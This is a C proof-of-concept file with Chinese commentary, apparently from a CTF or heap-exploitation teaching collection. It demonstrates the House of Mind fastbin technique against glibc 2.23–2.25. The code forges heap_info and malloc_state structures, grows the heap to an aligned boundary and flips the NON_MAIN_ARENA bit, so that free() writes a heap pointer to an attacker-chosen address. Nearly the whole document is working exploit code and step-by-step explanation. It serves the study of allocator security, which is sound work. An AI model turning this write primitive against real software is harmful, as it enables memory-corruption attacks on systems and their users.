/*
 * 中文导读（CTF 版）
 *
 * 手法：house_of_mind
 * 文件标注范围：2.23 ~ 2.25
 * 模拟漏洞：可按 HEAP_MAX_SIZE 对齐布局并单字节改 NON_MAIN_ARENA/arena 归属。
 * 核心流程：伪造 heap_info/malloc_state，使 free 把 chunk 写入 fake_arena.fastbinsY 对应的任意位置。
 * 成功判据：target 得到堆指针。2.43 删除 fastbin 收发路径后 fastbin 版本终止。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>

/*
 * House of Mind：fastbin 变体
 * ==============================
 *
 * 该变体继承经典 House of Mind 的核心思想：伪造一个非主 arena，让分配器
 * 在 free 时把本应写入 arena 管理结构的堆指针写到攻击者选择的位置。这里
 * 选用 fastbin 收链路径，因此得到的是“把被释放 chunk 地址写到某处”的
 * WRITE-WHERE 原语；若只关心写入一个较大的非零值，也可把它理解成类似旧
 * unsorted-bin attack 的受限写，但写入堆指针通常更有价值。
 *
 * 原始资料：
 * https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt
 * https://maxwelldulin.com/BlogPost?post=2257705984
 *
 * size 字段低三位分别承载 PREV_INUSE、IS_MMAPPED 与 NON_MAIN_ARENA。
 * 本手法只把 NON_MAIN_ARENA 位置一，不改变真实 chunk size。_int_free
 * 因而会用 arena_for_chunk(p) 查找所属 arena，而不是固定使用 main_arena。
 * 非主 arena 的定位逻辑可概括为：
 *
 *     heap_for_ptr(ptr) = ptr 按 HEAP_MAX_SIZE 向下对齐；
 *     arena 选择结果：arena_for_chunk(ptr) = heap_for_ptr(ptr)->ar_ptr。
 *
 * heap_info 的第一个字段 ar_ptr 正是 malloc_state 指针。攻击者先把某个可控
 * 堆地址推进到 HEAP_MAX_SIZE 边界，在那里伪造 heap_info，再让 ar_ptr 指向
 * 目标地址前方的 fake malloc_state。free 把受害块挂入
 * fake_arena->fastbinsY[fastbin_index(size)] 时，目标位置便得到受害块地址。
 *
 * 对照源码：
 * https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L48
 * https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L127
 *
 * 本 PoC 的具体步骤：
 * 1. 分配到一个可计算的 HEAP_MAX_SIZE 对齐边界，取得伪 heap_info 位置；
 * 2. 在可控内存伪造 malloc_state，并把 system_mem 设置为足够大的合法值；
 * 3. 在 heap_info 偏移 0 处写入伪 arena 的 ar_ptr；
 * 4. 只把 fastbin victim 的 NON_MAIN_ARENA 位置一；
 * 5. free(victim)，观察 victim 地址被写进 fake_arena 的对应 fastbinsY 槽。
 *
 * 所需原语与约束：
 * - 需要堆地址泄漏以计算对齐边界；特殊堆喷场景可能用概率布局替代泄漏；
 * - 需要大量可控分配，才能把 brk 堆推进到目标边界；
 * - 需要对 chunk size 的单字节覆盖，且该块最终必须走 fastbin；有 tcache
 *   的版本要先填满相应 tcache；
 * - fake_arena->system_mem 必须大于被释放 chunk size，否则 next-size/
 *   system_mem 检查会把它判为非法；
 * - victim 的后一物理块也必须有合法 size，即大于等于 MINSIZE 且小于
 *   上界字段 fake_arena->system_mem。
 *
 * 与经典 unsorted-bin attack 相比，这次写入通常不会直接破坏 malloc 的
 * 全局双链表；在布局允许时，还能用不同 fastbin size 对不同槽重复写入。
 * 原始 PoC 与讲解作者：Maxwell Dulin（Strikeout）。
 */

int main(){

	// 这两个常量决定堆段对齐粒度与每次推进 brk 堆时使用的请求大小。
	int HEAP_MAX_SIZE = 0x4000000;
	int MAX_SIZE = (128*1024) - 0x100; // 略低于默认 mmap 阈值，确保大块仍来自 brk 堆而不是独立 mmap。

	// 先在普通堆块中预留 fake arena；target_loc 对准对应 fastbinsY 槽。
	uint8_t* fake_arena = malloc(0x1000); 
	uint8_t* target_loc = fake_arena + 0x28;

	uint8_t* target_chunk = (uint8_t*) fake_arena - 0x10;

	/*
	 * 在 fake malloc_state 的 system_mem 字段写入足够大的值。_int_free 会
	 * 以 system_mem 为上界检查 victim 及其后一块的 size；若保持为零，
	 * 受害块会被判定为过大，尚未执行 fastbin 收链写入就中止。
	 */
	fake_arena[0x880] = 0xFF;
	fake_arena[0x881] = 0xFF; 
	fake_arena[0x882] = 0xFF; 

	// 把目标 chunk 地址向上推进一个 HEAP_MAX_SIZE，再向下对齐，得到伪 heap_info 边界。
	uint64_t new_arena_value = (((uint64_t) target_chunk) + HEAP_MAX_SIZE) & ~(HEAP_MAX_SIZE - 1);
	uint64_t* fake_heap_info = (uint64_t*) new_arena_value;

	uint64_t* user_mem = malloc(MAX_SIZE);

	/*
	 * fake heap_info 必须真正位于 arena_for_chunk 会计算出的对齐边界。
	 * 下面连续申请略低于 mmap 阈值的大块，推动 brk，直到用户区越过该边界；
	 * 于是之前算出的 fake_heap_info 地址已经落在攻击者可写的堆内存中。
	 */
	while((long long)user_mem < new_arena_value){
		user_mem = malloc(MAX_SIZE);
	}

	// 创建最终 victim；稍后只改其 NON_MAIN_ARENA 位，再由 free 触发目标写入。
	uint64_t* fastbin_chunk = malloc(0x50); // 请求 0x50，经 request2size 后物理尺寸为 0x60。
	uint64_t* chunk_ptr = fastbin_chunk - 2; // 从用户指针回退两个 size_t，得到 chunk header。

	/*
	 * 在 fake heap_info 偏移 0 写入 ar_ptr。ar_ptr 指向哪里，哪里就会被
	 * 当作 malloc_state 起点；真正的写入位置则由 fastbinsY 在结构内的
	 * 偏移和 fastbin_index(size) 共同决定。不同尺寸对应约 0x8~0x40
	 * 范围内的不同槽，因此目标地址必须反向减去该槽偏移来布置 fake arena。
	 * 2.23 源码入口：
	 * https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L1686
	 */

	fake_heap_info[0] = (uint64_t) fake_arena; // heap_info 的首字段就是 ar_ptr，令其指向 fake malloc_state。

	/*
	 * 漏洞触发点：仅把 size 的 NON_MAIN_ARENA 标志位置一，实际尺寸仍保持
	 * 0x60。这样后一块 size 检查仍与真实堆布局一致，而 arena_for_chunk
	 * 会改走 fake heap_info->ar_ptr，最终把 victim 写入伪 arena 的 fastbin。
	 */
	chunk_ptr[1] = 0x60 | 0x4; // 0x4 即 NON_MAIN_ARENA；不触碰其余尺寸位。

	//// 漏洞模拟结束：后续 free 是正常分配器路径。

	/*
	 * 2.23~2.25 的 malloc_state 中 fastbinsY 起始偏移是 0x8；0x60 chunk
	 * 对应 fastbinsY[4]，数组下标再贡献 0x20，所以实际写入位置是
	 * fake_arena+0x28。构造 fake_arena 时要像 unsorted-bin attack 使用
	 * target-0x10 一样，先按目标字段偏移反向修正结构基址。
	 */

	free(fastbin_chunk); // free 根据伪 ar_ptr 收链，把该堆指针写到 target_loc。

	// 对本版本的 0x60 victim，命中偏移应为 0x28；断言验证目标确实得到堆指针。

	assert(*((unsigned long *) (target_loc)) != 0);
}
